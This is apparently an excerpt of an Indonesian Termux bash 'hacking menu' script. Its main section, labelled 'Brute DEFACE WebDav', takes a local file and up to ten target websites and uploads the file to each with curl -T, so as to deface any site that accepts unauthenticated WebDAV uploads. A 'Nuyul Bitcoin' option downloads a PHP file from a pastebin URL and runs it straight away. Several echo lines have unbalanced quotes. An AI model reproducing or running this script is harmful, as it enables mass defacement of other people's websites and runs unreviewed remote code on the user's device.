...
echo "\033[36;1m[===============================================]>"
echo "50.> Tebak Tebak Kan Soal Cinta Tod:v"
echo "\033[32;1m[===============================================]>"
echo "51.> Nuyul Bitcoin"
echo "\033[36;1m[===============================================]>"
echo "0.> keluar"
echo "\033[35;1m[===============================================]>"
read -p "[MrB4J1N64N]==>" bro
...
clear
echo "\033[32;1m"
figlet -f slant Brute DEFACE WebDav
echo "Pilih script"
read -p "[MrB4J1N64N]>" script
echo "\033[36;1m"
echo "pilih Web target Ke1"
read -p "[MrB4J1N64N]>" Ke1
curl -T /storage/emulated/0/$script $Ke1
echo "\033[32;1m" "pilih Web target Ke2"
read -p "[MrB4J1N64N]>" Ke2
curl -T /storage/emulated/0/$script $Ke2
echo "\033[36;1m" "pilih Web target Ke3
read -p "[MrB4J1N64N]>" Ke3
curl -T /storage/emulated/0/$script $Ke3
echo "\033[32;1m" "pilih Web target Ke4"
read -p "[MrB4J1N64N]>" Ke4
curl -T /storage/emulated/0/$script $Ke4
echo "\033[36;1m" "pilih Web target Ke5
read -p "[MrB4J1N64N]>" Ke5
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "pilih Web target Ke6"
read -p "[MrB4J1N64N]>" Ke6
curl -T /storage/emulated/0/$script $Ke6
echo "\033[36;1m" "pilih Web Target Ke7"
read -p "[MrB4J1N64N]>" Ke7
curl -T /storage/emulated/0/$script $Ke7
echo "\033[32;1m " Pilih Web Target Ke8"
read -p "[MrB4J1N64N]>" Ke8
curl -T /storage/emulated/0/$script $Ke8
echo "\033[36;1m" "Pilih Web Target Ke9"
read -p "[MrB4J1N64N]>" Ke9
curl -T /storage/emulated/0/$script $Ke9
echo " \033[32;1m" "Pilih Web Target Ke10"
read -p "[MrB4J1N64N]>" Ke10
curl -T /storage/emulated/0/$script $Ke10
sleep 1
echo "\033[35;1m" " Mohon Tunggu Sebentar "
sleep 1
echo "***************SEDANG PROSES***************"
echo "Jika Gagal Berarti Web nya Tidak Vuln Bro!"
echo "Silahkan cek  $Ke1/$script"
echo "Silahkan cek  $Ke2/$script"
echo "Silahkan cek  $Ke3/$script"
echo "Silahkan cek  $Ke4/$script"
echo "Silahkan Cek $Ke5/$script"
echo "Silahkan Cek $Ke6/$script"
echo "Silahkan Cek $Ke7/$script"
echo "*************************SELESAI*************************"
fi
...
figlet "Mr.B4J1N64N" | lolcat
sleep 1
pkg install php -y && pkg install wget -y && wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL && php tuyul.php
fi
